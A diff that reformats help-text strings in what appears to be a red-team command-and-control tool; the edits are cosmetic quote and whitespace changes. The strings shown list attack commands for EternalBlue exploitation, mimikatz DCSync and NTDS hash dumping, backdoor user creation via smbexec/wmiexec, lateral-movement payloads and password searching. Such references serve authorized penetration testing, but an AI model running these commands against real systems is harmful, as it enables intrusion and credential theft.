@@ -23,7 +23,6 @@ unhide-implant
 help
 searchhelp mimikatz
 back
-
 """
 
 posh_help1 = """
@@ -91,7 +90,8 @@ invoke-ms16-032-proxypayload
 invoke-eternalblue -target 127.0.0.1  -initialgrooms 5 -maxattempts 1 -msfbind
 get-gpppassword
 get-content 'c:\\programdata\\mcafee\\common framework\\sitelist.xml'
-dir -recurse | select-string -pattern 'password='"""
+dir -recurse | select-string -pattern 'password='
+"""
 
 posh_help3 = """
 File Management:
@@ -122,7 +122,8 @@ invoke-smbclient -Action Put -source c:\\temp\\test.doc -destination \\test.com\
 invoke-smbexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
 invoke-wmiexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
 net view | net users | net localgroup administrators | net accounts /dom
-whoami /groups | whoami /priv"""
+whoami /groups | whoami /priv
+"""
 
 posh_help4 = """
 Active Directory Enumeration:
@@ -155,7 +156,8 @@ get-netdomain | get-netdomaincontroller | get-netforestdomain
 get-netforest | get-netforesttrust
 invoke-mapdomaintrust
 get-netuser -domain child.parent.com -filter samaccountname=test
-get-netgroup -domain child.parent.com | select samaccountname"""
+get-netgroup -domain child.parent.com | select samaccountname
+"""
 
 posh_help5 = """
 Domain / Network Tasks:
@@ -182,7 +184,8 @@ invoke-sniffer -outputfile c:\\temp\\output.txt -maxsize 50mb -localip 10.10.10.
 invoke-sqlquery -sqlserver 10.0.0.1 -user sa -pass sa -query 'select @@version'
 invoke-runas -user <user> -password '<pass>' -domain <dom> -command c:\\windows\\system32\\cmd.exe -args " /c calc.exe"
 invoke-pipekat -target <ip-optional> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional>
-invoke-wmiexec -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional> -command <cmd>"""
+invoke-wmiexec -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional> -command <cmd>
+"""
 
 posh_help6 = """
 Lateral Movement:
@@ -199,7 +202,9 @@ invoke-psexecdaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
 invoke-wmipayload -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional>
 invoke-wmiproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
 invoke-wmidaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
-invoke-winrmsession -ipaddress <ip> -user <dom\\user> -pass <pass>"""
+invoke-winrmsession -ipaddress <ip> -user <dom\\user> -pass <pass>
+"""
+
 posh_help7 = """
 Credentials / Tokens / Local Hashes (Must be SYSTEM):
 =========================================================
@@ -222,7 +227,9 @@ Credentials / Domain Controller Hashes:
 ============================================
 invoke-mimikatz -command '"lsadump::dcsync /domain:domain.local /user:administrator"'
 invoke-dcsync -pwdumpformat
-dump-ntds -emptyfolder <emptyfolderpath>"""
+dump-ntds -emptyfolder <emptyfolderpath>
+"""
+
 posh_help8 = """
 Useful Modules:
 ====================
@@ -263,7 +270,6 @@ exit
 
 
 pre_help = """
-
 Main Menu: 
 ================================
 use implant by <id>, e.g. 1
